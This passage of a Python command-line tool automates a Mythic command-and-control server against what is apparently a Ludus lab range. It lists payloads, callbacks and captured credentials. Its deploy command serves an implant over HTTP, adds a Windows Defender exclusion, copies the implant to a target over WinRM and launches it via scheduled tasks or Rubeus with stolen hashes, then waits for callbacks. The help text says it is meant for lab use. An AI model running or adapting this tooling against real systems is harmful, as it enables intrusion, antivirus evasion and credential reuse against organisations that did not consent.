async def command_list_payloads(args: argparse.Namespace) -> None:
    client = await mythic_login(args)
    rows = await list_payloads(client, args.payload_type, args.payload_limit)
    print(json.dumps([payload_summary(row) for row in rows], indent=2, sort_keys=True))


async def command_callbacks(args: argparse.Namespace) -> None:
    client = await mythic_login(args)
    rows = await get_callbacks(client)
    print(json.dumps([callback_identity(row) for row in rows], indent=2, sort_keys=True))


async def command_list_credentials(args: argparse.Namespace) -> None:
    client = await mythic_login(args)
    account_filter = normalize_principal(args.account)
    realm_filter = normalize_principal(args.realm)
    rows = []
    for credential in await get_credentials(client):
        account = normalize_principal(credential.get("account"))
        realm = normalize_principal(credential.get("realm"))
        if account_filter and account_filter not in account:
            continue
        if realm_filter and realm_filter != realm:
            continue
        secret = str(credential.get("credential_text") or "")
        rows.append({
            "id": credential.get("id"),
            "account": credential.get("account"),
            "realm": credential.get("realm"),
            "type": credential.get("type"),
            "comment": credential.get("comment"),
            "timestamp": credential.get("timestamp"),
            "secret_present": bool(secret),
            "secret_length": len(secret),
        })
    print(json.dumps(rows, indent=2, sort_keys=True))


async def command_deploy(args: argparse.Namespace) -> None:
    if not args.payload_url and not args.serve_host:
        raise DeployError("--serve-host is required unless --payload-url is supplied.")

    log_phase("mythic-login-start")
    client = await mythic_login(args)
    log_phase("mythic-login-ok")
    run_as_password_source = None
    run_as_hash_source = None
    if (
        args.run_as_user
        and args.launch_method not in {
            "rubeus-asktgt-netonly",
            "scheduled-task-s4u",
            "scheduled-task-interactive",
        }
        and not resolve_run_as_password(args)
        and args.run_as_credential_account
    ):
        password, source = await resolve_run_as_password_from_mythic(client, args)
        setattr(args, "_resolved_run_as_password", password)
        run_as_password_source = {"source": "mythic-credential", **source}
    if args.launch_method == "rubeus-asktgt-netonly":
        hash_value, source = await resolve_run_as_hash_from_mythic(client, args)
        setattr(args, "_resolved_run_as_hash", hash_value)
        run_as_hash_source = {"source": "mythic-credential", **source}
    callbacks_before = await get_callbacks(client)
    before_ids = {
        row["display_id"] for row in callbacks_before
        if isinstance(row.get("display_id"), int)
    }

    payload = None
    download = None
    local_path = None
    if args.payload_url:
        payload_url = args.payload_url
    else:
        log_phase("payload-select-start", payload_uuid=args.payload_uuid, payload_type=args.payload_type)
        payload = await get_payload(client, args)
        log_phase("payload-select-ok", payload_uuid=payload.get("uuid"))
        log_phase("payload-download-start")
        download = await download_payload(
            client,
            payload,
            Path(args.download_dir),
            args.output_name,
        )
        log_phase("payload-download-ok", bytes=download.get("bytes"), path=download.get("path"))
        local_path = Path(download["path"])
        payload_url = ""

    server = None
    try:
        rubeus_served_path = None
        if not args.payload_url:
            if args.launch_method == "rubeus-asktgt-netonly":
                rubeus_served_path = prepare_served_tool(Path(args.rubeus_path), local_path.parent)
            log_phase("http-server-start", bind_host=args.bind_host, port=args.serve_port)
            server, _thread = start_http_server(local_path.parent, args.bind_host, args.serve_port)
            served_port = server.server_port
            payload_url = f"http://{args.serve_host}:{served_port}/{quote(local_path.name)}"
            log_phase("http-server-ok", payload_url=payload_url)

        log_phase("ludus-host-select-start", target_host=args.target_host, target_ip=args.target_ip)
        host = select_ludus_host(args)
        log_phase("ludus-host-select-ok", inventory_hostname=host.get("inventory_hostname"), ansible_host=host.get("ansible_host"))
        log_phase("winrm-session-start")
        session = winrm_session(host, args.winrm_operation_timeout_seconds, args.winrm_read_timeout_seconds)
        log_phase("winrm-session-ok")
        source_filename = Path(args.payload_url).name if args.payload_url else local_path.name
        filename = args.remote_filename or default_remote_filename(source_filename, args.launch_method)
        remote_path = args.remote_path or windows_join(args.remote_dir, filename)
        defender_exclusion = None
        if args.add_defender_exclusion:
            log_phase("defender-exclusion-start", remote_path=remote_path)
            defender_exclusion = ensure_defender_exclusion(session, remote_path)
            log_phase("defender-exclusion-ok", remote_path=remote_path)
        log_phase("transfer-start", remote_path=remote_path, timeout_seconds=args.transfer_timeout_seconds)
        transfer = transfer_payload(session, payload_url, remote_path, args.transfer_timeout_seconds)
        log_phase("transfer-ok", remote_path=remote_path)
        if args.launch_method == "rubeus-asktgt-netonly":
            if rubeus_served_path is None:
                raise DeployError("Rubeus netonly launch requires local HTTP payload serving.")
            rubeus_url = f"http://{args.serve_host}:{served_port}/{quote(rubeus_served_path.name)}"
            remote_rubeus_path = windows_join(args.remote_dir, timestamped_remote_name(rubeus_served_path.name))
            log_phase("rubeus-transfer-start", remote_path=remote_rubeus_path)
            transfer_payload(session, rubeus_url, remote_rubeus_path, args.transfer_timeout_seconds)
            setattr(args, "_remote_rubeus_path", remote_rubeus_path)
            log_phase("rubeus-transfer-ok", remote_path=remote_rubeus_path)
        log_phase("launch-start", method=args.launch_method, run_as_user=args.run_as_user)
        launch = launch_payload(session, remote_path, args)
        log_phase("launch-ok", method=launch.get("Method") or launch.get("method"))

        log_phase("callback-wait-start", seconds=args.wait_callbacks_seconds)
        callbacks_after, new_callbacks = await wait_for_new_callbacks(
            client,
            before_ids,
            args.payload_type,
            args.wait_callbacks_seconds,
            args.poll_interval,
        )
        log_phase("callback-wait-done", new_callbacks=len(new_callbacks))
        interactive_session_disconnect = maybe_disconnect_interactive_session(
            session,
            args,
            launch,
            new_callbacks,
        )
        if interactive_session_disconnect:
            log_phase(
                "interactive-session-disconnect-done",
                skipped=bool(interactive_session_disconnect.get("skipped")),
                session_id=interactive_session_disconnect.get("SessionId"),
            )
        result = {
            "payload": payload_summary(payload) if payload else None,
            "download": download,
            "payload_url": payload_url,
            "target": {
                "inventory_hostname": host.get("inventory_hostname"),
                "ansible_host": host.get("ansible_host"),
                "remote_path": remote_path,
                "run_as_user": args.run_as_user,
                "run_as_password_source": run_as_password_source,
                "run_as_hash_source": run_as_hash_source,
            },
            "transfer": transfer,
            "launch": launch,
            "defender_exclusion": defender_exclusion,
            "interactive_session_disconnect": interactive_session_disconnect,
            "new_callbacks": [callback_identity(row) for row in new_callbacks],
            "callbacks_after": [callback_identity(row) for row in callbacks_after],
        }
        print(json.dumps(result, indent=2, sort_keys=True))
    finally:
        if server is not None:
            server.shutdown()
            server.server_close()


def add_mythic_args(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("--server", default=DEFAULT_MYTHIC_SERVER)
    parser.add_argument("--user", default=DEFAULT_MYTHIC_USER)
    parser.add_argument("--password", default=None)
    parser.add_argument("--env-path", default=str(MYTHIC_ENV_PATH))


def add_payload_args(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("--payload-type", default="apollo")
    parser.add_argument("--payload-uuid", default=None)
    parser.add_argument("--payload-limit", type=int, default=20)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    sub = parser.add_subparsers(dest="command", required=True)

    list_parser = sub.add_parser("list-payloads", help="List recent non-deleted Mythic payloads.")
    add_mythic_args(list_parser)
    add_payload_args(list_parser)
    list_parser.set_defaults(func=command_list_payloads)

    callbacks_parser = sub.add_parser("callbacks", help="List Mythic callbacks.")
    add_mythic_args(callbacks_parser)
    callbacks_parser.set_defaults(func=command_callbacks)

    credentials_parser = sub.add_parser("list-credentials", help="List redacted Mythic credential metadata.")
    add_mythic_args(credentials_parser)
    credentials_parser.add_argument("--account", default=None)
    credentials_parser.add_argument("--realm", default=None)
    credentials_parser.set_defaults(func=command_list_credentials)

    deploy_parser = sub.add_parser("deploy", help="Download, stage, and launch a payload on a Ludus host.")
    add_mythic_args(deploy_parser)
    add_payload_args(deploy_parser)
    deploy_parser.add_argument("--download-dir", default=str(DEFAULT_DOWNLOAD_DIR))
    deploy_parser.add_argument("--output-name", default=None)
    deploy_parser.add_argument("--payload-url", default=None)
    deploy_parser.add_argument("--serve-host", default=os.environ.get("SAGE_SERVE_HOST"))
    deploy_parser.add_argument("--bind-host", default="0.0.0.0")
    deploy_parser.add_argument("--serve-port", type=int, default=8765)
    deploy_parser.add_argument("--mcp-path", default=str(DEFAULT_MCP_PATH))
    deploy_parser.add_argument("--ludus-host", default=None)
    deploy_parser.add_argument("--target-host", default="CASTELBLACK")
    deploy_parser.add_argument("--target-ip", default=None)
    deploy_parser.add_argument("--remote-dir", default=DEFAULT_REMOTE_DIR)
    deploy_parser.add_argument("--remote-filename", default=None)
    deploy_parser.add_argument("--remote-path", default=None)
    deploy_parser.add_argument("--run-as-user", default=None)
    deploy_parser.add_argument("--run-as-password", default=None)
    deploy_parser.add_argument("--run-as-password-env", default="SAGE_RUN_AS_PASSWORD")
    deploy_parser.add_argument("--run-as-credential-account", default=None)
    deploy_parser.add_argument("--run-as-credential-realm", default=None)
    deploy_parser.add_argument("--run-as-credential-types", default="password,plaintext")
    deploy_parser.add_argument(
        "--launch-method",
        choices=[
            "auto",
            "current-user",
            "start-process",
            "scheduled-task",
            "scheduled-task-s4u",
            "scheduled-task-interactive",
            "rubeus-asktgt-netonly",
        ],
        default="auto",
    )
    deploy_parser.add_argument("--allow-s4u-task", action="store_true")
    deploy_parser.add_argument(
        "--add-defender-exclusion",
        action="store_true",
        help=(
            "Before transfer, add a narrow Defender ExclusionPath for the staged payload file. "
            "Use only for operator-owned foothold bootstrap on the lab range."
        ),
    )
    deploy_parser.add_argument("--run-as-hash-credential-types", default="hash,ntlm,rc4")
    deploy_parser.add_argument("--run-as-domain", default=None)
    deploy_parser.add_argument("--run-as-dc", default=None)
    deploy_parser.add_argument("--rubeus-path", default=str(DEFAULT_RUBEUS_PATH))
    deploy_parser.add_argument("--rubeus-timeout-seconds", type=int, default=25)
    deploy_parser.add_argument("--task-name", default=None)
    deploy_parser.add_argument("--wait-callbacks-seconds", type=int, default=20)
    deploy_parser.add_argument(
        "--wait-interactive-session-seconds",
        type=int,
        default=120,
        help="Seconds to wait for an active RDP/interactive session for --launch-method scheduled-task-interactive.",
    )
    deploy_parser.add_argument(
        "--disconnect-interactive-session",
        action=argparse.BooleanOptionalAction,
        default=True,
        help=(
            "After a new callback is observed for --launch-method scheduled-task-interactive, disconnect the "
            "RDP session with tsdiscon so the local client exits without logging off the Windows session."
        ),
    )
    deploy_parser.add_argument("--poll-interval", type=float, default=3.0)
    deploy_parser.add_argument("--transfer-timeout-seconds", type=int, default=45)
    deploy_parser.add_argument("--winrm-operation-timeout-seconds", type=int, default=45)
    deploy_parser.add_argument("--winrm-read-timeout-seconds", type=int, default=75)
    deploy_parser.set_defaults(func=command_deploy)

    return parser


async def async_main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    try:
        await args.func(args)
        return 0
    except DeployError as exc:
        print(json.dumps({"ok": False, "error": str(exc)}, indent=2, sort_keys=True), file=sys.stderr)
        return 2


def main() -> int:
    return asyncio.run(async_main())


if __name__ == "__main__":
    raise SystemExit(main())
